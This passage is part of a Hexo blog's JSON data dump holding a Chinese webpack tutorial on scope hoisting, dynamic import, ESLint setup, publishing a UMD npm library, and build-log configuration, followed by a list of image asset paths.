class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"comment\">// 对于 webpack-dev-server，这个属性要放在 devServer 对象里。</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  stats: <span class=\"string\">'errors-only'</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>当然更详细配置可以用对象来罗列具体每条规则。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//..</span></span><br><span class=\"line\">  stats: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// copied from `'minimal'`</span></span><br><span class=\"line\">    all: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    modules: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    maxModules: <span class=\"number\">0</span>,</span><br><span class=\"line\">    errors: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    warnings: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// our additional options</span></span><br><span class=\"line\">    moduleTrace: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    errorDetails: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>实际使用中，我们发现内置的过于简单，详细配置又过于繁琐，有没有更加友好的插件呢？</p>\n<h3 id=\"friendly-errors-webpack-plugin的使用\"><a href=\"#friendly-errors-webpack-plugin的使用\" class=\"headerlink\" title=\"friendly-errors-webpack-plugin的使用\"></a><code>friendly-errors-webpack-plugin</code>的使用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ..</span></span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> FriendlyErrorsWebpackPlugin()],</span><br><span class=\"line\">  stats: <span class=\"string\">'errors-only'</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>使用后效果：<br><img src=\"/webpack-advance-2/error.jpg\" alt=\"friendly-errors-webpack-plugin使用效果图\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《极客时间》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文介绍的 webpack 用法有：Scope Hosting 的使用和原理分析。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Scope-Hosting-的使用和原理分析\"><a href=\"#Scope-Hosting-的使用和原理分析\" class=\"headerlink\" title=\"Scope Hosting 的使用和原理分析\"></a>Scope Hosting 的使用和原理分析</h2><h3 id=\"构建后的代码存在大量闭包代码\"><a href=\"#构建后的代码存在大量闭包代码\" class=\"headerlink\" title=\"构建后的代码存在大量闭包代码\"></a>构建后的代码存在大量闭包代码</h3><p>大量作用域包裹代码，导致体积增大（模块越多越明显）；运行代码时创建的函数作用域变多，内存开销变大。<br><img src=\"/webpack-advance-2/scope-hoisting.jpg\" alt=\"\"></p>\n<h3 id=\"webpack-的模块机制\"><a href=\"#webpack-的模块机制\" class=\"headerlink\" title=\"webpack 的模块机制\"></a>webpack 的模块机制</h3><p><img src=\"/webpack-advance-2/module.jpg\" alt=\"\"></p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>将所有模块的代码按照引用顺序放在一个函数作用域里，然后适当的重命名一些变量以防止变量名冲突。</p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>要求必须是 ES6 语法（原因同上一篇 tree shaking），CommonJS 不支持。若是 webpack4.x 设置 mode 为 production 后默认开启，之前版本及其他模式需要显式引用<code>ModuleConcatenationPlugin</code>插件，示例如下：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> webpack = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack'</span>)</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> webpack.optimize.ModuleConcatenationPlugin()]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码分割和动态-import\"><a href=\"#代码分割和动态-import\" class=\"headerlink\" title=\"代码分割和动态 import\"></a>代码分割和动态 import</h2><p>对于大的 web 应用，把所有代码放到一个文件显然不合适，一般会根据需要进行分割。常见处理方式有：提出公共代码，见上一篇“提取页面公共资源”部分；脚本懒加载，使得初始加载的代码更小。</p>\n<h3 id=\"懒加载-JS-方式\"><a href=\"#懒加载-JS-方式\" class=\"headerlink\" title=\"懒加载 JS 方式\"></a>懒加载 JS 方式</h3><ul>\n<li>CommonJS：require.ensure</li>\n<li>ES6：动态 import（目前还没有原生支持，需要 babel 转换）</li>\n</ul>\n<h3 id=\"动态-import\"><a href=\"#动态-import\" class=\"headerlink\" title=\"动态 import\"></a>动态 import</h3><h4 id=\"安装配置：\"><a href=\"#安装配置：\" class=\"headerlink\" title=\"安装配置：\"></a>安装配置：</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install @babel/plugin-syntax-dynamic-import -D</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// .babelrc</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"@babel/preset-env\"</span>, <span class=\"string\">\"@babel/preset-react\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: [<span class=\"string\">\"@babel/plugin-syntax-dynamic-import\"</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"打包后效果示例：\"><a href=\"#打包后效果示例：\" class=\"headerlink\" title=\"打包后效果示例：\"></a>打包后效果示例：</h4><p><img src=\"/webpack-advance-2/import.jpg\" alt=\"\"></p>\n<h4 id=\"懒加载使用示例：\"><a href=\"#懒加载使用示例：\" class=\"headerlink\" title=\"懒加载使用示例：\"></a>懒加载使用示例：</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// text.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> () =&gt; <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>动态 import<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'../../common/index'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> logo <span class=\"keyword\">from</span> <span class=\"string\">'./images/logo.png'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'./search.less'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Search</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      Text: <span class=\"literal\">null</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  loadComponent() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">import</span>(<span class=\"string\">'./text.js'</span>).then(<span class=\"function\"><span class=\"params\">textModule</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        Text: textModule.default</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; Text &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">'search-text'</span>&gt;</span><br><span class=\"line\">        &#123;Text ? <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Text</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">Text</span>&gt;</span></span> : <span class=\"literal\">null</span>&#125;</span><br><span class=\"line\">        搜索文字的内容</span><br><span class=\"line\">        &lt;img src=&#123;logo&#125; onClick=&#123;<span class=\"keyword\">this</span>.loadComponent.bind(<span class=\"keyword\">this</span>)&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">ReactDOM.render(&lt;Search /</span>&gt;, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"在-webpack-中使用-ESLint\"><a href=\"#在-webpack-中使用-ESLint\" class=\"headerlink\" title=\"在 webpack 中使用 ESLint\"></a>在 webpack 中使用 ESLint</h2><p>以下以基于 Airbnb 的 eslint 规则库的使用为例</p>\n<h3 id=\"安装依赖包\"><a href=\"#安装依赖包\" class=\"headerlink\" title=\"安装依赖包\"></a>安装依赖包</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> airbnb的eslint规则库</span><br><span class=\"line\">npm i eslint-config-airbnb -D</span><br><span class=\"line\"><span class=\"meta\">#</span> airbnb的eslint规则库依赖包</span><br><span class=\"line\">npm i eslint eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y -D</span><br><span class=\"line\"><span class=\"meta\">#</span> eslint解析器</span><br><span class=\"line\">npm i babel-eslint -D</span><br><span class=\"line\"><span class=\"meta\">#</span> webpack loader</span><br><span class=\"line\">npm i eslint-loader -D</span><br></pre></td></tr></table></figure>\n<h3 id=\"配置-eslint-和-webpack\"><a href=\"#配置-eslint-和-webpack\" class=\"headerlink\" title=\"配置 eslint 和 webpack\"></a>配置 eslint 和 webpack</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// .eslintrc.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  parser: <span class=\"string\">'babel-eslint'</span>,</span><br><span class=\"line\">  extends: <span class=\"string\">'airbnb'</span>,</span><br><span class=\"line\">  env: &#123;</span><br><span class=\"line\">    browser: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    node: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">        rules: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: <span class=\"regexp\">/\\.(js|jsx)$/</span>,</span><br><span class=\"line\">                exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">                use: [<span class=\"string\">'babel-loader'</span>, &#123;</span><br><span class=\"line\">                    loader: <span class=\"string\">'eslint-loader'</span>,</span><br><span class=\"line\">                    options: &#123;</span><br><span class=\"line\">                        fix: <span class=\"literal\">true</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"webpack-打包组件和基础库\"><a href=\"#webpack-打包组件和基础库\" class=\"headerlink\" title=\"webpack 打包组件和基础库\"></a>webpack 打包组件和基础库</h2><p>webpack 除了可以用来打包应用，也可以用来打包 js 库，当然可能打包 js 库用 rollup 更适合。本次以实现一个大整数加法库为例讲下实现过程。</p>\n<p>要求：</p>\n<ul>\n<li>需要打包压缩版 large-number-jovy.min.js 和非压缩版本 large-number-jovy.js；</li>\n<li>支持 AMD/CJS/ESM 模块引入和 Script 标签引入；</li>\n</ul>\n<p>目录结构：<br><img src=\"/webpack-advance-2/large-number.jpg\" alt=\"large-number项目结构图\"></p>\n<p>安装配置：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i terser-webpack-plugin -D</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> TerserPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'terser-webpack-plugin'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  mode: <span class=\"string\">'none'</span>,</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    <span class=\"string\">'large-number-jovy'</span>: <span class=\"string\">'./src/index.js'</span>,</span><br><span class=\"line\">    <span class=\"string\">'large-number-jovy.min'</span>: <span class=\"string\">'./src/index.js'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    filename: <span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">    library: <span class=\"string\">'largeNumberJovy'</span>, <span class=\"comment\">//指定库的全局变量</span></span><br><span class=\"line\">    libraryExport: <span class=\"string\">'default'</span>,</span><br><span class=\"line\">    libraryTarget: <span class=\"string\">'umd'</span> <span class=\"comment\">//支持库引入的方式</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    minimize: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    minimizer: [</span><br><span class=\"line\">      <span class=\"keyword\">new</span> TerserPlugin(&#123;</span><br><span class=\"line\">        include: <span class=\"regexp\">/\\.min\\.js$/</span></span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>设置入口文件：</p>\n<p>package.json 的 main 字段为 index.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (process.env.NODE_ENV === <span class=\"string\">'production'</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">module</span>.exports = <span class=\"built_in\">require</span>(<span class=\"string\">'./dist/large-number-jovy.min.js'</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">module</span>.exports = <span class=\"built_in\">require</span>(<span class=\"string\">'./dist/large-number-jovy.js'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发布：<br><em>默认已经在 npm 注册了账号，并且登录了，否则请先注册登录。</em></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm publish</span><br></pre></td></tr></table></figure>\n<p>查看：<br><img src=\"/webpack-advance-2/large-number2.jpg\" alt=\"large-number发布成功图\"></p>\n<p>使用：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 安装</span><br><span class=\"line\">npm i large-number-jovy -S</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// react</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> LargeNumber <span class=\"keyword\">from</span> <span class=\"string\">'large-number-jovy'</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#123;LargeNumber(<span class=\"string\">'999999'</span>, <span class=\"string\">'1'</span>)&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"优化构建时命令行的显示日志\"><a href=\"#优化构建时命令行的显示日志\" class=\"headerlink\" title=\"优化构建时命令行的显示日志\"></a>优化构建时命令行的显示日志</h2><p>每次构建命令行都会显示很多日志信息，我们是不是可以定制显示信息呢？例如只显示错误日志。答案是当然可以，了解下<a href=\"https://webpack.docschina.org/configuration/stats/#src/components/Sidebar/Sidebar.jsx\" target=\"_blank\" rel=\"noopener\">stats</a>配置项。stats 值为 String 或者 Object，字符串值是内置的一套规则的名称，有如下几种：</p>\n<ul>\n<li>error-only：只在发生错误时输出</li>\n<li>minimal：只在发生错误或有新的编译时输出</li>\n<li>none：没有输出</li>\n<li>normal：标准输出</li>\n<li>verbose：全部输出</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"comment\">// 对于 webpack-dev-server，这个属性要放在 devServer 对象里。</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//...</span></span><br><span class=\"line\">  stats: <span class=\"string\">'errors-only'</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>当然更详细配置可以用对象来罗列具体每条规则。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//..</span></span><br><span class=\"line\">  stats: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// copied from `'minimal'`</span></span><br><span class=\"line\">    all: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    modules: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    maxModules: <span class=\"number\">0</span>,</span><br><span class=\"line\">    errors: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    warnings: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// our additional options</span></span><br><span class=\"line\">    moduleTrace: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    errorDetails: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>实际使用中，我们发现内置的过于简单，详细配置又过于繁琐，有没有更加友好的插件呢？</p>\n<h3 id=\"friendly-errors-webpack-plugin的使用\"><a href=\"#friendly-errors-webpack-plugin的使用\" class=\"headerlink\" title=\"friendly-errors-webpack-plugin的使用\"></a><code>friendly-errors-webpack-plugin</code>的使用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ..</span></span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> FriendlyErrorsWebpackPlugin()],</span><br><span class=\"line\">  stats: <span class=\"string\">'errors-only'</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>使用后效果：<br><img src=\"/webpack-advance-2/error.jpg\" alt=\"friendly-errors-webpack-plugin使用效果图\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《极客时间》</p>"}],"PostAsset":[{"_id":"source/_posts/2018/2018-08-06-delaunay-2/1.jpg","slug":"1.jpg","post":"ck0m3d8py000ywovv92efxd97","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之缓动函数分析及动画库/creatJs.png","slug":"creatJs.png","post":"ck0m3d8qu001fwovv7qx081og","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之缓动函数分析及动画库/easingFunction.png","slug":"easingFunction.png","post":"ck0m3d8qu001fwovv7qx081og","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之缓动函数分析及动画库/jqueryEasing.png","slug":"jqueryEasing.png","post":"ck0m3d8qu001fwovv7qx081og","modified":0,"renderable":0},{"_id":"source/_drafts/2018-09-19-x2en/x2en.gif","slug":"x2en.gif","post":"ck0m3d8e70002wovvpokojl3q","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之缓动函数分析及动画库/gsap.png","slug":"gsap.png","post":"ck0m3d8qu001fwovv7qx081og","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-07-10-hexo-about/01.jpg","slug":"01.jpg","post":"ck0m3d8oj000pwovvadql8qae","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-08-06-delaunay-3/1.jpg","slug":"1.jpg","post":"ck0m3d8pv000wwovvtgitnn34","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-08-07-delaunay-5/GIF.gif","slug":"GIF.gif","post":"ck0m3d8q90017wovvfcs7s2wt","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-08-07-delaunay-4/1.gif","slug":"1.gif","post":"ck0m3d8q50014wovv8f7uvp06","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-07-25-nodemailer/emailEjs.jpg","slug":"emailEjs.jpg","post":"ck0m3d8oi000nwovvfhzmzons","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-07-25-nodemailer/emailTemplate.jpg","slug":"emailTemplate.jpg","post":"ck0m3d8oi000nwovvfhzmzons","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-12-18-JS高设3版-1/1-1.jpg","slug":"1-1.jpg","post":"ck0m3d8q10011wovv477yrct4","modified":0,"renderable":0},{"_id":"source/_posts/2018/2018-12-18-JS高设3版-1/1-2.jpg","slug":"1-2.jpg","post":"ck0m3d8q10011wovv477yrct4","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之定时器详解/setInterval.png","slug":"setInterval.png","post":"ck0m3d8qz001iwovv5i49tj76","modified":0,"renderable":0},{"_id":"source/_posts/2018/JS动画之定时器详解/setTimeout.png","slug":"setTimeout.png","post":"ck0m3d8qz001iwovv5i49tj76","modified":0,"renderable":0},{"_id":"source/_posts/2018/print/print1.jpg","slug":"print1.jpg","post":"ck0m3d8rv0020wovva1l9v60h","modified":0,"renderable":0},{"_id":"source/_posts/2018/print/print2.jpg","slug":"print2.jpg","post":"ck0m3d8rv0020wovva1l9v60h","modified":0,"renderable":0},{"_id":"source/_posts/2018/width、naturalWidth、clientWidth、offsetWidth区别整理/clientWidth.png","slug":"clientWidth.png","post":"ck0m3d8rz0024wovvcyk0thlv","modified":0,"renderable":0},{"_id":"source/_posts/2018/width、naturalWidth、clientWidth、offsetWidth区别整理/offsetWidth.png","slug":"offsetWidth.png","post":"ck0m3d8rz0024wovvcyk0thlv","modified":